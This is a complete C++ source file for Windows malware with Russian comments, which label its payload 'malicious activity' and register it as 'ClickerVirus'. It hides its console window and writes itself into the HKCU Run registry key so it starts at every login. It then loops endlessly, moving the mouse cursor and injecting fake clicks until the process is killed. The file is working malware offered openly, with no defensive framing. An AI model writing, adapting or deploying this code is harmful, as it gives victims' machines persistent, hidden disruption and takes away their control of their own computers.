#include <iostream>
#include <Windows.h>
#include <string>

// Добавление в автозагрузку
void AddToStartup();

// Основная вредоносная активность
void MaliciousActivity();

int main()
{
	// Подключение Русского языка для консоли
	SetConsoleCP(CP_UTF8);
	SetConsoleOutputCP(CP_UTF8);

	// Скрываем консоль с программой
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	// Добавляем в автозагрузку
	AddToStartup();

	// Запускаем основную активность
	MaliciousActivity();


	return EXIT_SUCCESS;
}

void AddToStartup()
{
	// Создание ключа реестра
	HKEY hKey;

	// Массив для хранения пути к программе
	char exePath[MAX_PATH];
	// Узнаём где лежит программа
	GetModuleFileNameA(NULL, exePath, MAX_PATH);

	// Открываем реестр для записи
	LONG result = RegOpenKeyExA(
		HKEY_CURRENT_USER,
		"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		KEY_SET_VALUE,
		&hKey
	);

	// Проверка результата
	if (result == ERROR_SUCCESS)
	{
		// Записываем значение в реестр
		RegSetValueExA(
			hKey,
			"ClickerVirus",
			0,
			REG_SZ,
			(BYTE*)exePath,
			strlen(exePath) + 1
		);

		// Закрытие ключа
		RegCloseKey(hKey);

		// Выводим данные о успешном добавлении в автозагрузку
		std::cout << "[+] Успешно добавлено в автозагрузку!" << std::endl;
		std::cout << "    Имя в реестре: ClickerVirus" << std::endl;
		std::cout << "    Путь: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" << std::endl;
	}
	// Если не удалось открыть ключ
	else
	{
		std::cout << "[-] Ошибка открытия ключа реестра. Код: " << result << std::endl;
	}
}

void MaliciousActivity()
{
	std::cout << "[*] Вредоносная активность запущена!" << std::endl;
	std::cout << std::endl;

	// Бесконечный цикл
	// Программа будет работать пока её не убьют
	while (true)
	{
		// Получаем позицию курсора
		POINT cursorPos;
		GetCursorPos(&cursorPos);

		// Немного двигаем курсор
		SetCursorPos(cursorPos.x + 10, cursorPos.y + 10);

		// Небольшая пауза
		Sleep(100);

		// Имитируем клик
		mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
		mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);

		// Небольшая пауза
		Sleep(100);

		// Возвращаем курсор обратно
		SetCursorPos(cursorPos.x, cursorPos.y);

		Sleep(500);
	}
}